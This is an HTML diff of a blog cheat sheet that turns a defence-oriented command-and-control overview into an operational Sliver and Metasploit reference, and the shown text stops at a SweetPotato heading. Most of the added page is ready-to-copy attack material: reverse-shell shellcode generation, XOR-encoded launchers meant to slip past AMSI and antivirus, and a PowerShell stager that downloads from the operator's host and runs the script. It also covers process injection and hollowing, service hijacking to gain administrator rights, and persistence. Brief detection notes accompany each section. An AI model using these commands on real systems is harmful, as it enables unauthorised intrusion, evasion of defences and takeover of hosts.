@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Command &amp; Control — d0me</title>
-<meta name="description" content="C2 の索引。設計・ペイロード生成・リスナー・egress/リダイレクタ・運用痕跡と、対になる検知/対策。">
+<meta name="description" content="Sliver / Metasploit C2 operational reference — listeners, payloads, session ops, privesc, and lateral movement.">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -13,140 +13,621 @@
 </head>
 <body>
 
-<header class="topbar"><div class="wrap">
-  <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
-  <button class="nav-toggle" aria-label="メニュー">≡</button>
-  <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
-</div></header>
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
 
 <main>
-<section class="sheet-hero"><div class="wrap">
-  <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Command &amp; Control</div>
-  <h1>Command &amp; Control</h1>
-  <p class="lede">初期アクセス後の指揮統制。設計(リスナー/リダイレクタ/egress)、ペイロード生成、運用時の痕跡と検知までを、公開フレームワーク前提で扱う。実装の武器化ではなく構成と観測点に主眼を置く。
-    <span class="jp">前提: 検証環境。フレームワークは Metasploit / Sliver を想定。丸ごと動く回避チェーンは載せない。</span></p>
-</div></section>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Command &amp; Control</div>
+    <h1>Command &amp; Control</h1>
+    <p class="lede">Operational reference for Sliver and Metasploit — listener setup, payload generation, session stabilization, privilege escalation, and lateral movement.<span class="jp">Sliver と Metasploit の実務リファレンス — listener 構築、payload 生成、session 安定化、権限昇格、横展開までを両フレームワーク並列で整理。</span></p>
+  </div>
+</section>
 
-<div class="wrap"><div class="sheet-layout">
+<div class="wrap">
+<section class="attack-flow" aria-label="C2 operational flow">
+  <div class="flow-head">
+    <span class="hx">##</span>
+    <span class="lbl">C2 Ops Flow</span>
+    <span class="jp">運用フェーズ軸</span>
+    <span class="rt">click phase → jump to section</span>
+  </div>
+  <div class="flow-chain">
+    <a class="flow-phase" href="#s01">
+      <span class="p-num">01 · SETUP</span>
+      <span class="p-title">Setup</span>
+      <span class="p-jp">サーバ / クライアント / Armory</span>
+      <span class="p-techs">sliver-server · client profile · armory · msfconsole · workspace</span>
+    </a>
+    <a class="flow-phase" href="#s02">
+      <span class="p-num">02 · LISTENERS</span>
+      <span class="p-title">Listeners</span>
+      <span class="p-jp">受信基盤</span>
+      <span class="p-techs">http/mtls/dns · stage-listener · multi/handler</span>
+    </a>
+    <a class="flow-phase" href="#s03">
+      <span class="p-num">03 · PAYLOADS</span>
+      <span class="p-title">Payloads</span>
+      <span class="p-jp">投下物</span>
+      <span class="p-techs">implant generate · msfvenom · XOR · staged · beacon</span>
+    </a>
+    <a class="flow-phase" href="#s04">
+      <span class="p-num">04 · SESSION OPS</span>
+      <span class="p-title">Session Ops</span>
+      <span class="p-jp">セッション安定化</span>
+      <span class="p-techs">migrate · hollow · execute-shellcode · duplication</span>
+    </a>
+    <a class="flow-phase" href="#s05">
+      <span class="p-num">05 · PRIV ESC</span>
+      <span class="p-title">Privilege Escalation</span>
+      <span class="p-jp">権限昇格</span>
+      <span class="p-techs">Modifiable Svc · SeImpersonate · AlwaysInstall · UAC bypass</span>
+    </a>
+    <a class="flow-phase" href="#s06">
+      <span class="p-num">06 · LATERAL</span>
+      <span class="p-title">Lateral Movement</span>
+      <span class="p-jp">横展開</span>
+      <span class="p-techs">BOF · psexec · jump-psexec · jump-wmiexec · SharpRDP</span>
+    </a>
+  </div>
+</section>
+</div>
+
+<div class="wrap">
+<div class="sheet-layout">
   <aside class="toc">
     <div class="toc-label">目次</div>
     <ul>
-      <li><a href="#arch">01 設計 / architecture</a></li>
-      <li><a href="#payload">02 ペイロード生成</a></li>
-      <li><a href="#listener">03 リスナー</a></li>
-      <li><a href="#egress">04 egress / redirector</a></li>
-      <li><a href="#opsec">05 運用と痕跡</a></li>
-      <li><a href="#ref">06 参照</a></li>
+      <li><a href="#s01">01 Setup</a></li>
+      <li><a href="#s02">02 Listeners</a></li>
+      <li><a href="#s03">03 Payloads</a></li>
+      <li><a href="#s04">04 Session Ops</a></li>
+      <li><a href="#s05">05 Priv Esc</a></li>
+      <li><a href="#s06">06 Lateral</a></li>
+      <li><a href="#ref">07 References</a></li>
     </ul>
   </aside>
 
   <article class="doc">
-    <section id="arch" class="reveal">
-      <h2><span class="num">01</span>設計<span class="jp">architecture</span></h2>
-      <p>C2 は「オペレータ ← リダイレクタ ← ビーコン」の三層で考える。オペレータのチームサーバを直接晒さず、前段にリダイレクタ(HTTP/S・DNS)を置いて到達性と匿名性を分離する。検知面はビーコンの周期性・JA3・証明書・DNS 量に現れるため、設計段階で「何が観測されるか」を先に決める。</p>
-      <table>
-        <thead><tr><th>層</th><th>役割</th><th>観測される痕跡</th></tr></thead>
-        <tbody>
-          <tr><td>ビーコン</td><td>被害ホスト上のインプラント</td><td>周期通信・親子プロセス・メモリ特徴</td></tr>
-          <tr><td>リダイレクタ</td><td>前段プロキシ(HTTPS/DNS)</td><td>証明書・JA3/JA3S・ドメイン評価</td></tr>
-          <tr><td>チームサーバ</td><td>オペレータ側の制御</td><td>(直接晒さない)</td></tr>
-        </tbody>
-      </table>
+
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Setup<span class="jp">サーバ / クライアント / Armory</span></h2>
+      <p>Sliver operates as a client-server C2 with an optional multiplayer mode. Metasploit runs as a single-node console with a PostgreSQL backend for workspace and loot management. Both frameworks are installed once per operator machine and reused across engagements.</p>
+
+      <h3>Sliver — Server</h3>
+      <p>Fetch the pre-compiled server binary from BishopFox releases. Multiplayer mode must be explicitly enabled before any operator can attach.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Install and launch server</span>
+wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
+chmod +x ./sliver-server_linux
+./sliver-server_linux
+
+<span class="c"># Generate operator profile (from within server console)</span>
+[server] sliver &gt; new-operator -n <span class="v">&lt;OPERATOR&gt;</span> -l <span class="v">&lt;LHOST&gt;</span>
+[*] Saved new client config to: /&lt;path&gt;/&lt;OPERATOR&gt;_&lt;LHOST&gt;.cfg
+
+<span class="c"># Enable multiplayer (required for remote client attach)</span>
+[server] sliver &gt; multiplayer
+[*] Multiplayer mode enabled!</code></pre></div>
+
+      <h3>Sliver — Client</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
+chmod +x ./sliver-client_linux
+./sliver-client_linux import /&lt;path&gt;/&lt;OPERATOR&gt;_&lt;LHOST&gt;.cfg
+./sliver-client_linux</code></pre></div>
+
+      <h3>Sliver — Armory</h3>
+      <p>The Armory ships 20+ aliases (BOFs and .NET assemblies) and 100+ extensions covering situational awareness, credential access, and lateral movement. Install once per client.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>sliver &gt; armory install all
+
+<span class="c"># Individual install</span>
+sliver &gt; armory install sharpsh
+sliver &gt; armory install stracciatella
+sliver &gt; armory install rubeus</code></pre></div>
+
+      <h3>Metasploit — Console &amp; Workspace</h3>
+      <p>Ensure the PostgreSQL backend is running so <code>db_status</code> reports <em>connected</em>. Workspaces isolate hosts, credentials, and loot per engagement.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>sudo systemctl start postgresql
+msfconsole -q</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; db_status
+<span class="k">msf6</span> &gt; workspace -a <span class="v">&lt;engagement&gt;</span>
+<span class="k">msf6</span> &gt; workspace <span class="v">&lt;engagement&gt;</span>
+<span class="k">msf6</span> &gt; hosts
+<span class="k">msf6</span> &gt; services -p 445</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>Sliver and Metasploit can coexist on the same operator host — Sliver for evasion-heavy engagements and MSF for rapid staging or post-exploitation modules. Cross-framework handoff is done via msfvenom shellcode fed into Sliver's <code>execute-shellcode</code>, or Sliver session drop into an MSF handler.</div>
+
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>ビーコンの周期性(jitter を除いた規則性)と長寿命セッションをネットワークで検知。</li>
-          <li>新規・低評価ドメインへの外向き TLS、異常な JA3/JA3S を相関。</li>
+          <li>Egress detection on unauthorized outbound HTTPS/mTLS from operator subnets — C2 traffic often uses TLS pinning or self-signed certs, which SSL inspection can flag.</li>
+          <li>Endpoint EDR baselines catching Sliver's default implant signatures (obfuscation reduces but does not eliminate this).</li>
+          <li>Blue-team infrastructure enumeration: Shodan / Censys fingerprint of exposed Sliver / MSF listeners.</li>
         </ul>
       </div>
     </section>
 
-    <section id="payload" class="reveal">
-      <h2><span class="num">02</span>ペイロード生成<span class="jp">payloads</span></h2>
-      <p>配送形態(exe / dll / shellcode / スクリプト)は実行文脈と検知面のトレードオフで選ぶ。ディスク実行は静的面、インメモリは動的面が増える(Evasion 巻参照)。ここでは公開ツールの用途整理に留める。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 生シェルコード（検証用・段階的にテスト）</span>
-msfvenom -p windows/x64/meterpreter/reverse_https \
-  LHOST=<span class="v">$LHOST</span> LPORT=443 -f raw -o beacon.bin
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>Listeners<span class="jp">受信基盤</span></h2>
+      <p>Listeners receive callbacks from implants. Sliver separates the <em>listener</em> (network binding) from the <em>profile</em> (payload metadata) — this lets you regenerate implants for a phantom listener or stage over TCP while keeping HTTP for the second stage. Metasploit uses <code>exploit/multi/handler</code> with matching payload options.</p>
 
-<span class="c"># PE/.NET/スクリプトを position-independent 化</span>
-donut -i input.exe -o loader.bin</code></pre></div>
-      <div class="note"><span class="lbl">tips</span>LHOST は tun0 依存で毎回変わる: <code>$(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)</code></div>
+      <h3>Sliver — HTTP / staged listeners</h3>
+      <p><code>profiles new</code> creates a reusable payload template; <code>stage-listener</code> serves stagers; <code>http -L</code> binds the actual reception endpoint.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 64-bit shellcode-format profile + HTTP listener</span>
+profiles new --http <span class="v">&lt;LHOST&gt;</span>:8088 --format shellcode http-x64
+stage-listener --url tcp://<span class="v">&lt;LHOST&gt;</span>:4443 --profile http-x64
+http -L <span class="v">&lt;LHOST&gt;</span> --lport 8088
+
+<span class="c"># 32-bit variant (some AV pipelines process x86 differently)</span>
+profiles new --http <span class="v">&lt;LHOST&gt;</span>:9090 --format shellcode -a x86 http-x86
+stage-listener --url tcp://<span class="v">&lt;LHOST&gt;</span>:5553 --profile http-x86
+http -L <span class="v">&lt;LHOST&gt;</span> --lport 9090
+
+<span class="c"># Service-format profile for lateral movement (jump-psexec)</span>
+profiles new --http <span class="v">&lt;LHOST&gt;</span>:8099 --format service svc-lateral
+http -L <span class="v">&lt;LHOST&gt;</span> --lport 8099</code></pre></div>
+
+      <h3>Sliver — mTLS / DNS listeners</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># mTLS: encrypted mutual auth, blends with corporate mTLS</span>
+mtls -L <span class="v">&lt;LHOST&gt;</span> --lport 8443
+
+<span class="c"># DNS: covert channel via TXT records</span>
+dns -d <span class="v">&lt;C2_DOMAIN&gt;</span> --no-canaries</code></pre></div>
+
+      <h3>Metasploit — multi/handler</h3>
+      <p>Match the payload, LHOST, and LPORT exactly to what msfvenom produced. Use <code>ExitOnSession false</code> for persistent handlers accepting multiple callbacks.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use exploit/multi/handler
+<span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="k">msf6</span> &gt; set LHOST <span class="v">&lt;LHOST&gt;</span>
+<span class="k">msf6</span> &gt; set LPORT 4443
+<span class="k">msf6</span> &gt; set EXITFUNC thread
+<span class="k">msf6</span> &gt; set ExitOnSession false
+<span class="k">msf6</span> &gt; exploit -j
+
+<span class="c"># Common payload alternates</span>
+<span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_https
+<span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_winhttps
+<span class="k">msf6</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp   <span class="c"># x86</span></code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>For HTTPS payloads set <code>OverrideRequestHost true</code> if traffic goes through a redirector; set <code>StagerVerifySSLCert false</code> only for self-signed testing (never in production engagements).</div>
+
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>既知フレームワークの既定スタブ・エクスポート・文字列を静的シグネチャで検知。</li>
-          <li>ASR ルールと WDAC でスクリプト系ステージャ・未署名バイナリの実行を抑止。</li>
+          <li>Anomaly detection on beacon regularity (fixed jitter/interval callbacks stand out in NetFlow / Zeek).</li>
+          <li>JA3/JA4 TLS fingerprinting against Sliver's Go TLS stack and MSF's Ruby stack.</li>
+          <li>Rare user-agent strings from unattended hosts; Sliver's default UA is well-catalogued.</li>
         </ul>
       </div>
     </section>
 
-    <section id="listener" class="reveal">
-      <h2><span class="num">03</span>リスナー<span class="jp">listeners</span></h2>
-      <p>HTTPS を既定にし、証明書とプロファイル(User-Agent・URI・ヘッダ)を正規トラフィックに寄せる。DNS ビーコンは egress が絞られた環境の代替。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Sliver: HTTPS リスナー + ビーコン生成</span>
-sliver &gt; https --lport 443
-sliver &gt; generate beacon --http <span class="v">$C2_HOST</span> --os windows --arch amd64 \
-  --jitter 30 --seconds 60
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>Payloads<span class="jp">投下物</span></h2>
+      <p>Sliver stages MSF-generated shellcode inside XOR-encoded launchers (VBA, PowerShell, C#, ASPX). Alternatively Sliver's native <code>generate beacon</code> produces standalone implants with evasion features. Metasploit's <code>msfvenom</code> is the ubiquitous shellcode generator underpinning both flows.</p>
 
-<span class="c"># Metasploit: reverse_https ハンドラ</span>
-msfconsole -qx "use exploit/multi/handler; \
-  set payload windows/x64/meterpreter/reverse_https; \
-  set LHOST <span class="v">$LHOST</span>; set LPORT 443; run"</code></pre></div>
+      <h3>Metasploit — msfvenom shellcode</h3>
+      <p>Raw shellcode output feeds every downstream encoding step. <code>EXITFUNC=thread</code> is safer than <code>process</code> for in-process execution (leaves host process alive).</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># x64 raw shellcode</span>
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=4443 EXITFUNC=thread \
+  -f raw -o <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
+
+<span class="c"># x86 raw shellcode</span>
+sudo msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=5553 EXITFUNC=thread \
+  -f raw -o <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x86.bin
+
+<span class="c"># Direct EXE (staged reverse_https, useful for AlwaysInstallElevated)</span>
+sudo msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=8443 EXITFUNC=thread \
+  -f exe -o <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe</code></pre></div>
+
+      <h3>XOR-encoded launchers (from raw shellcode)</h3>
+      <p>XOR with a single-byte key (2 in these examples) bypasses signature-based AMSI/AV pattern matches on raw meterpreter bytes. Change the key per engagement.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerShell $buf array (XOR key = 2)</span>
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=4443 EXITFUNC=thread -f raw \
+  | xxd -ps -c 1 \
+  | python3 -c 'import sys; key = 2; print(<span class="s">"[Byte[]] $buf = "</span> + <span class="s">","</span>.join([f<span class="s">"0x{(int(x, 16) ^ key):02X}"</span> for x in sys.stdin.read().split()]))'
+
+<span class="c"># C# byte[] buf (XOR key = 2)</span>
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=4443 EXITFUNC=thread -f raw \
+  | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); enc = bytes([b ^ key for b in data]); print(f<span class="s">"byte[] buf = new byte[{len(enc)}] {{ "</span> + <span class="s">", "</span>.join([f<span class="s">"0x{b:02X}"</span> for b in enc]) + <span class="s">" };"</span>)'
+
+<span class="c"># VBA / VBS Array (XOR key = 2, chunked for line-length limits)</span>
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=5553 EXITFUNC=thread -f raw \
+  | xxd -ps -c 1 \
+  | python3 -c 'import sys; key = 2; data = [str(int(x, 16) ^ key) for x in sys.stdin.read().split()]; cs = 50; ck = [data[i:i+cs] for i in range(0, len(data), cs)]; print(<span class="s">"buf = Array("</span>, end=<span class="s">""</span>); print(<span class="s">", _\n"</span>.join([<span class="s">", "</span>.join(c) for c in ck]) + <span class="s">")"</span>)'</code></pre></div>
+
+      <h3>PowerShell one-liner stager</h3>
+      <p>Downloads a second-stage script from the operator's HTTP server and IEX-executes it. UTF-16LE + base64 encoding required by <code>-EncodedCommand</code>.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>echo -en <span class="s">"(New-Object System.Net.WebClient).DownloadString('http://&lt;LHOST&gt;/payload.ps1') | IEX"</span> \
+  | iconv -t UTF-16LE | base64 -w 0
+
+<span class="c"># On target</span>
+powershell -enc <span class="v">&lt;BASE64_PAYLOAD&gt;</span></code></pre></div>
+
+      <h3>Sliver — native beacon</h3>
+      <p>Sliver's <code>generate beacon</code> produces a standalone implant with obfuscation and AMSI evasion built in. <code>--evasion</code> enables extra hardening at a size cost.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>profiles new --http <span class="v">&lt;LHOST&gt;</span>:8088 --format shellcode http-x64
+http -L <span class="v">&lt;LHOST&gt;</span> --lport 8088
+
+generate beacon --http <span class="v">&lt;STAGING&gt;</span>:8088 \
+  --name payload.obfuscated --os windows \
+  --seconds 5 --jitter 0 --evasion</code></pre></div>
+
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>既定 C2 プロファイル(既知 URI・User-Agent・自己署名証明書)をIDS/プロキシで検知。</li>
-          <li>内部→外部 443 のうち、TLS フィンガープリントが一般ブラウザと乖離するものを監視。</li>
+          <li>YARA rules on the msfvenom shellcode prologue and Sliver's implant framing (both are publicly indexed).</li>
+          <li>AMSI: modern Defender detects the plaintext meterpreter blob; XOR + in-memory delivery mitigates this only when AMSI is bypassed (see <a href="evasion.html">evasion</a>).</li>
+          <li>Egress DNS/HTTP logging catches stager fetches from unusual hosts.</li>
         </ul>
       </div>
     </section>
 
-    <section id="egress" class="reveal">
-      <h2><span class="num">04</span>egress / リダイレクタ<span class="jp">到達性の分離</span></h2>
-      <p>チームサーバを直接晒さないため、前段にリダイレクタを置く。HTTP/S は socat / nginx、DNS は権威委任で構成する。ドメイン評価とカテゴリが検知の分かれ目になる。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 単純な TCP リダイレクタ（検証）</span>
-socat TCP4-LISTEN:443,fork,reuseaddr TCP4:<span class="v">$TEAMSERVER</span>:443</code></pre></div>
-      <div class="note warn"><span class="lbl">注意</span>ドメインフロンティングは多くの CDN で対策済み。成立可否は環境依存で、恒常的手段として当てにしない。</div>
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul>
-          <li>SNI とホストヘッダの不一致、CDN 経由の異常な宛先を検知。</li>
-          <li>DNS の異常(高頻度 TXT/NULL、長いサブドメイン、エントロピー高)を監視。</li>
-        </ul>
-      </div>
-    </section>
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>Session Ops<span class="jp">セッション安定化</span></h2>
+      <p>Initial callbacks are unstable — the host process (Word, browser, one-shot loader) can die or be sandboxed. Migration into a stable, long-lived process (explorer, svchost, notepad) is standard hygiene. Sliver offers <code>migrate</code>, <code>execute-shellcode -p</code>, and <code>hollow</code>; Metasploit exposes the classic <code>migrate</code> command plus post modules.</p>
 
-    <section id="opsec" class="reveal">
-      <h2><span class="num">05</span>運用と痕跡<span class="jp">opsec</span></h2>
-      <ul>
-        <li><strong>周期性を崩す</strong> — jitter を入れ、規則的ビーコンの検知を避ける。</li>
-        <li><strong>プロセス系譜</strong> — office→cmd→powershell のような不自然な親子連鎖を作らない。</li>
-        <li><strong>最小限の常駐</strong> — 不要な永続化・多重セッションは痕跡と検知面を増やす。</li>
-      </ul>
+      <h3>Sliver — sacrificial process + injection</h3>
+      <p>Spawn a target process first (so it belongs to the current user context), enumerate its PID, then inject. Notepad is the canonical sacrifice; <code>svchost</code> is preferred for hollowing.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Launch sacrificial process (match arch to your shellcode)</span>
+execute C:\\windows\\system32\\notepad.exe
+execute -T notepad
+execute C:\\windows\\SysWOW64\\notepad.exe   <span class="c"># x86</span>
+
+<span class="c"># Or via Rubeus createnetonly (creates process in alt logon context)</span>
+rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
+rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe
+
+<span class="c"># Find the PID</span>
+ps -e notepad
+ps -e explorer   <span class="c"># explorer.exe = long-lived host, ideal for beacons</span></code></pre></div>
+
+      <h3>Sliver — inject shellcode into PID</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># x86 injection (arch auto-detected)</span>
+execute-shellcode -A 386 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x86.bin
+execute-shellcode -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x86.bin
+
+<span class="c"># x64 injection with ShikataGaNai encoding + reflection</span>
+execute-shellcode -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
+execute-shellcode -S -r -I 10 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
+
+<span class="c"># Migration (native Sliver command)</span>
+migrate -p <span class="v">&lt;PID&gt;</span></code></pre></div>
+
+      <h3>Sliver — process hollowing</h3>
+      <p>Hollowing creates a suspended svchost, unmaps its image, and writes shellcode into the freed region. High evasion value but sometimes throws a benign error post-injection.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>hollow svchost.exe <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
+
+<span class="c"># Expected benign error (shell still received):</span>
+[!] Call extension error: rpc error: code = Unknown desc = The parameter is incorrect.</code></pre></div>
+
+      <h3>Metasploit — migrate &amp; post modules</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">meterpreter</span><button class="copy">copy</button></div><pre><code>meterpreter &gt; ps
+meterpreter &gt; migrate <span class="v">&lt;PID&gt;</span>
+meterpreter &gt; migrate -N explorer.exe   <span class="c"># by name</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Auto-migrate post module (finds a target and migrates)</span>
+<span class="k">msf6</span> &gt; use post/windows/manage/migrate
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; set NAME explorer.exe
+<span class="k">msf6</span> &gt; run
+
+<span class="c"># Session persistence — auto-relaunch on session death</span>
+<span class="k">msf6</span> &gt; use exploit/windows/local/persistence
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; run</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>Always duplicate the implant into a hollowed process before running anything AV-visible (SweetPotato, mimikatz). The primary implant remaining in a sacrificial notepad will get killed the moment defender wakes up.</div>
+
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
         <ul>
-          <li>C2 は三層(ビーコン/リダイレクタ/チームサーバ)で設計し、晒す面を最小化する。</li>
-          <li>検知はビーコンの周期性・TLS フィンガープリント・DNS 量に出る。設計段階で観測点を決める。</li>
-          <li>既定プロファイルはそのまま署名対象。URI・UA・証明書を正規化しないと即バレる。</li>
-          <li>ドメインフロンティングは環境依存で恒久策にならない。egress 監視が防御側の要。</li>
+          <li>Never operate from the initial callback process. Migrate immediately.</li>
+          <li>Match architecture explicitly: x86 shellcode in x64 process (or vice versa) will crash silently.</li>
+          <li>Hollowing is the most robust technique when EDR is present, at the cost of a spurious error message.</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>Privilege Escalation<span class="jp">権限昇格</span></h2>
+      <p>Once a stable low-privilege session is established, enumerate escalation paths. Sliver runs C# assemblies in-process (<code>execute-assembly -i</code>) or side-loads via <code>execute-assembly</code>; PowerShell scripts pass through SharpSh with AMSI bypass. Metasploit's <code>local_exploit_suggester</code> maps kernel bugs; specific exploit modules handle SeImpersonate/UAC.</p>
+
+      <h3>Enumeration — Sliver</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Identity / privileges via BOF (quieter than shell whoami)</span>
+sa-whoami
+execute -o whoami /all
+
+<span class="c"># Group / user context</span>
+seatbelt -- -group=all
+seatbelt -- -group=user
+
+<span class="c"># SharpUp — Windows privesc audit</span>
+sharpup -- audit
+sharpup -i -- audit
+
+<span class="c"># PowerUp via SharpSh</span>
+sharpsh -t 40 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerUp.ps1 -c "Invoke-AllChecks"'</span>
+
+<span class="c"># winPEAS via SharpSh (long-running, 400s timeout)</span>
+sharpsh -t 400 -- <span class="s">'-u http://&lt;LHOST&gt;/winPEAS.ps1 -c 1'</span></code></pre></div>
+
+      <h3>Enumeration — Metasploit</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use post/multi/recon/local_exploit_suggester
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; run
+
+<span class="c"># Windows-specific privilege enumeration</span>
+<span class="k">msf6</span> &gt; use post/windows/gather/win_privs
+<span class="k">msf6</span> &gt; use post/windows/gather/enum_patches</code></pre></div>
+
+      <h3>Modifiable Service</h3>
+      <p>A misconfigured service whose ACL allows non-admin to modify <code>binPath</code> is exploited by rewriting the binary path to add the current user to <em>Administrators</em>, then restarting the service under SYSTEM.</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Inspect and rewrite service config (SNMPTRAP is a common misconfig example)</span>
+execute -o sc qc <span class="v">&lt;SERVICE_NAME&gt;</span>
+execute -o sc config <span class="v">&lt;SERVICE_NAME&gt;</span> binPath= <span class="s">"net localgroup Administrators domain.com\\<span class="v">&lt;USER&gt;</span> /add"</span> obj= <span class="s">"NT AUTHORITY\\SYSTEM"</span>
+execute -o sc config <span class="v">&lt;SERVICE_NAME&gt;</span> start= auto
+execute -o sc start <span class="v">&lt;SERVICE_NAME&gt;</span>
+
+<span class="c"># Verify local admin membership</span>
+execute -o net localgroup administrators</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use exploit/windows/local/service_permissions
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; run</code></pre></div>
+
+      <h3>SeImpersonate — SweetPotato</h3>
